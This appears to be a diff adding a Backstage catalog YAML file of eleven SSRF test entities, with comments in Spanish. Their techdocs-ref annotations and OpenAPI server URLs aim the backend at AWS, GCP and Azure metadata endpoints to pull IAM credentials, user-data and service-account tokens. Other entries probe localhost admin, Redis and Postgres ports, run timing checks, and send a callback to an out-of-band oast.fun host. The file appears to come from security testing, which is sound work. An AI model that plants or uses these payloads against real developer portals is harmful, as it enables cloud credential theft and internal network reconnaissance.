@@ -1,0 +1,390 @@
+# Todos los tests como APIs ejecutables desde Swagger UI
+
+# Test 1: AWS Metadata IAM Roles
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-aws-iam-roles-api
+  title: AWS IAM Roles Discovery API
+  description: Testing backend SSRF to AWS metadata for IAM roles
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  tags:
+    - aws-metadata
+    - iam-roles
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: AWS IAM Roles Test
+      version: 1.0.0
+      description: Backend should attempt to fetch IAM roles from metadata
+    servers:
+      - url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    paths:
+      /:
+        get:
+          summary: Get IAM Roles List
+          description: If backend processes techdocs-ref, it will fetch this
+          responses:
+            '200':
+              description: List of IAM role names
+
+---
+# Test 2: AWS User Data
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-aws-userdata-api
+  title: AWS User Data Extraction API
+  description: Testing backend SSRF to extract user-data scripts
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/user-data
+  tags:
+    - aws-metadata
+    - user-data
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: AWS User Data Test
+      version: 1.0.0
+      description: Backend should attempt to fetch user-data from metadata
+    servers:
+      - url: http://169.254.169.254/latest/user-data
+    paths:
+      /:
+        get:
+          summary: Get User Data Script
+          description: May contain secrets, keys, configuration
+          responses:
+            '200':
+              description: User data script content
+
+---
+# Test 3: AWS Instance Identity
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-aws-identity-api
+  title: AWS Instance Identity API
+  description: Testing backend SSRF to get instance identity document
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/dynamic/instance-identity/document
+  tags:
+    - aws-metadata
+    - identity
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: AWS Instance Identity Test
+      version: 1.0.0
+      description: Backend should fetch instance identity document
+    servers:
+      - url: http://169.254.169.254/latest/dynamic/instance-identity/
+    paths:
+      /document:
+        get:
+          summary: Get Instance Identity Document
+          description: Contains AWS account ID, region, instance type
+          responses:
+            '200':
+              description: Instance identity JSON document
+
+---
+# Test 4: Localhost Admin Panel
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-localhost-admin-api
+  title: Localhost Admin Panel API
+  description: Testing SSRF to internal admin endpoints
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:8080/admin
+  tags:
+    - localhost
+    - admin
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Localhost Admin Test
+      version: 1.0.0
+      description: Backend should attempt to reach internal admin panel
+    servers:
+      - url: http://127.0.0.1:8080/
+    paths:
+      /admin:
+        get:
+          summary: Admin Panel
+          responses:
+            '200':
+              description: Admin panel content
+
+---
+# Test 5: Port Scan - Redis
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-port-redis-api
+  title: Port Scan Redis API
+  description: Testing if Redis port is accessible via SSRF
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:6379/
+  tags:
+    - port-scan
+    - redis
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Redis Port Scan
+      version: 1.0.0
+      description: Backend attempts to connect to Redis port
+    servers:
+      - url: http://127.0.0.1:6379/
+    paths:
+      /:
+        get:
+          summary: Redis Connection Test
+          responses:
+            '200':
+              description: Redis accessible
+
+---
+# Test 6: Port Scan - PostgreSQL
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-port-postgres-api
+  title: Port Scan PostgreSQL API
+  description: Testing if PostgreSQL port is accessible via SSRF
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:5432/
+  tags:
+    - port-scan
+    - postgresql
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: PostgreSQL Port Scan
+      version: 1.0.0
+      description: Backend attempts to connect to PostgreSQL port
+    servers:
+      - url: http://127.0.0.1:5432/
+    paths:
+      /:
+        get:
+          summary: PostgreSQL Connection Test
+          responses:
+            '200':
+              description: PostgreSQL accessible
+
+---
+# Test 7: GCP Metadata
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-gcp-metadata-api
+  title: GCP Metadata API
+  description: Testing SSRF to Google Cloud metadata endpoint
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+  tags:
+    - gcp-metadata
+    - cloud
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: GCP Metadata Test
+      version: 1.0.0
+      description: Backend should attempt to fetch GCP service account token
+    servers:
+      - url: http://metadata.google.internal/computeMetadata/v1/
+    paths:
+      /instance/service-accounts/default/token:
+        get:
+          summary: Get GCP Service Account Token
+          responses:
+            '200':
+              description: GCP access token
+
+---
+# Test 8: Azure Metadata
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-azure-metadata-api
+  title: Azure Metadata API
+  description: Testing SSRF to Azure metadata endpoint
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://169.254.169.254/metadata/instance?api-version=2021-02-01
+  tags:
+    - azure-metadata
+    - cloud
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Azure Metadata Test
+      version: 1.0.0
+      description: Backend should attempt to fetch Azure instance metadata
+    servers:
+      - url: http://169.254.169.254/metadata/
+    paths:
+      /instance:
+        get:
+          summary: Get Azure Instance Metadata
+          parameters:
+            - name: api-version
+              in: query
+              required: true
+              schema:
+                type: string
+                default: "2021-02-01"
+          responses:
+            '200':
+              description: Azure instance metadata
+
+---
+# Test 9: Timing Test - Reachable
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-timing-fast-api
+  title: Timing Test - Fast Response
+  description: Should respond fast if metadata is reachable
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/meta-data/
+  tags:
+    - timing-test
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Fast Response Test
+      version: 1.0.0
+      description: Compare import time with slow test
+    servers:
+      - url: http://169.254.169.254/latest/meta-data/
+    paths:
+      /:
+        get:
+          summary: Metadata Root
+          responses:
+            '200':
+              description: Fast response
+
+---
+# Test 10: Timing Test - Unreachable
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-timing-slow-api
+  title: Timing Test - Slow Response
+  description: Should timeout if IP is not reachable
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://192.0.2.1/timeout-test
+  tags:
+    - timing-test
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Slow Response Test
+      version: 1.0.0
+      description: Should timeout - compare with fast test
+    servers:
+      - url: http://192.0.2.1/
+    paths:
+      /timeout-test:
+        get:
+          summary: Unreachable Endpoint
+          responses:
+            '200':
+              description: Will timeout
+
+---
+# Test 11: Interact.sh Verification
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-interact-verification-api
+  title: Interact.sh Backend Verification
+  description: Verify backend makes requests vs frontend
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/backend-verification
+  tags:
+    - interact-test
+    - verification
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Backend Verification Test
+      version: 1.0.0
+      description: Check interact.sh - backend request should arrive immediately on import
+    servers:
+      - url: https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun
+    paths:
+      /backend-verification:
+        get:
+          summary: Backend Request (on import)
+          description: Should appear in interact.sh with server User-Agent
+          responses:
+            '200':
+              description: Backend made request
+      /frontend-click:
+        get:
+          summary: Frontend Request (on Execute)
+          description: Should appear in interact.sh with Mozilla User-Agent
+          responses:
+            '200':
+              description: Frontend made request
